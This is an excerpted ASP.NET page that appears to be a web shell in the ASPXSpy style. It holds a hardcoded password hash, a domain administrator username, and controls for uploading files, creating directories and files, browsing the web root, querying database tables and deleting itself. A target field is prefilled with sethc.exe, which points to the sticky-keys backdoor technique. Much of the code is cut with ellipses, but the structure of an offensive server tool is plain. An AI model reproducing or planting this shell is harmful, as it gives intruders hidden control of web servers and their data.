...
<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
	...
	<head>
		...
		<script src="//cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/2.0.2/anime.min.js"></script>
		<link rel="stylesheet" href="https://do124574.github.io/stylex.css">
		<style>hr{border-width:3px;border-color:#ebf4f7;top:5.8em;-webkit-animation:6s infinite thread2;-moz-animation:6s infinite thread2;-o-animation:6s infinite thread2;animation:6s infinite thread2;background:0 0) repeat-x}@-webkit-keyframes thread2{0%,100%,50%{width:100%}80%{width:0}}@-moz-keyframes thread2{0%,100%,50%{width:100%}80%{width:0}}@-o-keyframes thread2{0%,100%,50%{width:100%}80%{width:0}}@keyframes thread2{0%,100%,50%{width:100%}80%{width:0}}
  </style>
	</head>
	<body>
<div class="container">
...
<script runat="server">
	public const string Version="X";
	public const string Password="f6be22ac8779f309fa92c828f1f52aaa";
	private const string DomainUserName="administrator";
	...
	{
		string s="<nav class='navbar navbar-expand-lg navbar-light bg-light' style='margin-top: 10px;'> Host Trust Level:&nbsp;&nbsp;<span style='color:red;'>{0}</span>&nbsp;&nbsp;IsFull-Trust:&nbsp;&nbsp;<span style='color:red;'>{1}</span>&nbsp;&nbsp;User:&nbsp&nbsp;<span style='color:red;'>{2}</span></nav>";
	...
	private void Bin_DataBind()
	{
		try
		{
			...
			for(int i=0;i<Bin_DataGrid.Items.Count;i++)
			{
				...
				zcg_SetControlAttribute(Bin_DataGrid.Items[i]);
				Bin_DataGrid.Items[i].Attributes["onclick"]="ASPMrd.Bin_Textarea_Query.value='select * from " + tname + "';";
			}
			Bin_DataGrid.Visible=true;
		}
		catch(Exception e)
...
<title><%=Version + " - " +Request.ServerVariables["SERVER_NAME"]%></title>
	...
	<style type='text/css'>.Bin_Style_Login { margin-top: 20px; width: 250px; height: 25px; color: white; background: transparent; border: 1px solid white; margin-left: 20px; text-align: center; }</style>
</head>
<body style="margin:0;table-layout:fixed;">
	<form id="ASPMrd" runat="server">
	...
	<h2 id="Bin_H2_Title" runat="server"></h2><span style="float:right;" id="Bin_Span_FrameVersion" runat="server"></span>
	<%--FileList--%>
 ...
 <tr>
	...
	<div style="float:right;" class="u"><input id="Bin_Lable_File" class="input" runat="server" type="file" style=" height:22px"/>
	<asp:Button ID="Bin_Button_Upload" CssClass="bt" runat="server" Text="Upload" OnClick="Bin_Button_Upload_Click"/></div><asp:LinkButton ID="Bin_Button_WebRoot" runat="server" Text="WebRoot" OnClick="Bin_Button_WebRoot_Click"></asp:LinkButton> | <a href="#" id="Bin_Button_CreateDir" runat="server">Create Directory</a> | <a href="#" id="Bin_Button_CreateFile" runat="server">Create File</a>
	 | <span id="Bin_Span_Drv" runat="server"></span><a href="#" id="Bin_Button_KillMe" runat="server" style="color:Red">Kill Me</a>
		...
		<asp:Table ID="Bin_Table_File" runat="server" Width="100%" CellSpacing="0" class="table table-bordered mt-3 hoverTable">
...
<td style="width:20%" align="left">Target : <input id="Bin_TextBox_Target" class="input" runat="server" type="text" style="height:16px" size="40" value="c:\windows\system32\sethc.exe"/>&nbsp;&nbsp;&nbsp;&nbsp;<asp:Button runat="server" 
 ...
 <tr>
	...
	<div id="zcg_div_PluginResult" runat="server"></div>
		...
		<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">Copyleft &copy; 2022 No Rights Reserved.</div></div>
